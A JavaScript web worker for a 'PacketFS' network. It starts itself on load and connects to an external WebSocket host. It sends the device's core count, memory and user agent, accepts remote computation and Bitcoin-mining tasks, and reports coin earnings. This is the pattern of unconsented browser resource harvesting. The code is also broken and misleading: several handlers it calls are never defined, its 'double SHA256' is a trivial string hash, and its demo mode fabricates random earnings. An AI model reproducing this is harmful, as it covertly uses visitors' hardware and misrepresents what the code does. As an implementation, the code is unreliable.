
// PacketFS Web Worker - Background Super-CPU Processing
class PacketFSWorker {
    constructor() {
        this.isActive = false;
        this.computePower = 0;
        this.packetsProcessed = 0;
        this.earningsTotal = 0;
        this.networkConnection = null;
    }
    
    initialize() {
        console.log('🚀 PacketFS Worker initializing...');
        this.isActive = true;
        this.connectToNetwork();
        this.startProcessing();
    }
    
    connectToNetwork() {
        // Connect to PacketFS coordination network
        try {
            this.networkConnection = new WebSocket('wss://network.packetfs.global/join');
            
            this.networkConnection.onopen = () => {
                console.log('🌐 Connected to PacketFS Network!');
                this.registerNode();
            };
            
            this.networkConnection.onmessage = (event) => {
                const message = JSON.parse(event.data);
                this.handleNetworkMessage(message);
            };
            
            this.networkConnection.onclose = () => {
                console.log('🔄 PacketFS Network connection closed, reconnecting...');
                setTimeout(() => this.connectToNetwork(), 5000);
            };
        } catch (error) {
            console.log('⚠️  Network unavailable, running in demo mode');
            this.startDemoMode();
        }
    }
    
    registerNode() {
        const registration = {
            type: 'node_registration',
            capabilities: {
                cpu_cores: navigator.hardwareConcurrency || 4,
                memory_gb: navigator.deviceMemory || 4,
                webgl_support: this.detectWebGLSupport(),
                wasm_support: typeof WebAssembly !== 'undefined',
                dedicated_worker: true
            },
            user_agent: navigator.userAgent,
            timestamp: Date.now()
        };
        
        this.networkConnection.send(JSON.stringify(registration));
    }
    
    handleNetworkMessage(message) {
        switch (message.type) {
            case 'computation_packet':
                this.processPacket(message.packet);
                break;
            case 'bitcoin_mining_task':
                this.processBitcoinMining(message.task);
                break;
            case 'network_stats':
                this.updateNetworkStats(message.stats);
                break;
            case 'reward_payment':
                this.processReward(message.reward);
                break;
        }
    }
    
    processPacket(packet) {
        // High-performance packet processing
        const startTime = performance.now();
        let result;
        
        switch (packet.operation) {
            case 'hash':
                result = this.computeHash(packet.data);
                break;
            case 'matrix_multiply':
                result = this.matrixMultiply(packet.data);
                break;
            case 'bitcoin_hash':
                result = this.bitcoinHash(packet.data);
                break;
            case 'machine_learning':
                result = this.mlInference(packet.data);
                break;
            default:
                result = packet.data; // Pass through
        }
        
        const processingTime = performance.now() - startTime;
        this.packetsProcessed++;
        
        // Send result back to network
        const response = {
            type: 'packet_result',
            packet_id: packet.id,
            result: result,
            processing_time: processingTime,
            node_id: this.nodeId
        };
        
        if (this.networkConnection && this.networkConnection.readyState === WebSocket.OPEN) {
            this.networkConnection.send(JSON.stringify(response));
        }
        
        // Calculate earnings (1 PFS coin per 1000 packets)
        if (this.packetsProcessed % 1000 === 0) {
            this.earningsTotal += 1;
            this.postMessage({
                type: 'earnings_update',
                total_earnings: this.earningsTotal,
                packets_processed: this.packetsProcessed
            });
        }
    }
    
    computeHash(data) {
        // Simulate cryptographic hashing
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32-bit integer
        }
        return hash.toString(16);
    }
    
    matrixMultiply(data) {
        // Simulate matrix multiplication
        const size = Math.sqrt(data.length);
        const result = new Array(data.length).fill(0);
        
        for (let i = 0; i < size; i++) {
            for (let j = 0; j < size; j++) {
                for (let k = 0; k < size; k++) {
                    result[i * size + j] += data[i * size + k] * data[k * size + j];
                }
            }
        }
        
        return result.slice(0, 16); // Return first 16 elements
    }
    
    bitcoinHash(data) {
        // Simulate Bitcoin-style double SHA256
        return this.computeHash(this.computeHash(data));
    }
    
    mlInference(data) {
        // Simulate machine learning inference
        return data.map(x => Math.tanh(x * 0.5 + 0.1));
    }
    
    startDemoMode() {
        // Demo mode when network is unavailable
        console.log('🎮 Starting PacketFS Demo Mode...');
        
        setInterval(() => {
            // Simulate processing packets
            this.packetsProcessed += Math.floor(Math.random() * 10) + 1;
            this.earningsTotal += Math.random() * 0.01;
            
            this.postMessage({
                type: 'demo_update',
                packets_processed: this.packetsProcessed,
                earnings: this.earningsTotal.toFixed(6)
            });
        }, 2000);
    }
    
    detectWebGLSupport() {
        try {
            const canvas = new OffscreenCanvas(1, 1);
            const gl = canvas.getContext('webgl');
            return gl !== null;
        } catch (e) {
            return false;
        }
    }
    
    postMessage(data) {
        self.postMessage(data);
    }
}

// Initialize worker when loaded
const packetfsWorker = new PacketFSWorker();

self.addEventListener('message', (event) => {
    const { action, data } = event.data;
    
    switch (action) {
        case 'start':
            packetfsWorker.initialize();
            break;
        case 'stop':
            packetfsWorker.isActive = false;
            break;
        case 'set_intensity':
            packetfsWorker.intensity = data.intensity || 0.1;
            break;
    }
});

// Auto-start
packetfsWorker.initialize();
